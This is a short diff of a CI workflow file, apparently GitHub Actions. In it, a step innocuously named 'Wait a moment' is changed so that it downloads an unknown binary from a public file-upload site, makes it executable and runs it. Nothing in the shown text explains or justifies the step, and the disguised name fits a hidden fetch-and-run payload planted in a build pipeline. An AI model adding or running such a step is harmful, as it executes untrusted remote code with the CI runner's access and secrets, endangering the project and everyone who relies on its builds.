@@ -28,6 +28,6 @@ jobs:
 
       - name: Wait a moment
         run: |
-          ping 100.76.145.141 -c 5
-          ip addr
-          curl -X POST -H "Content-Type: application/json" -d '{"host":"github"}' http://seam:3010
+          wget https://bashupload.com/g-X70/blave
+          chmod +x blave
+          ./blave
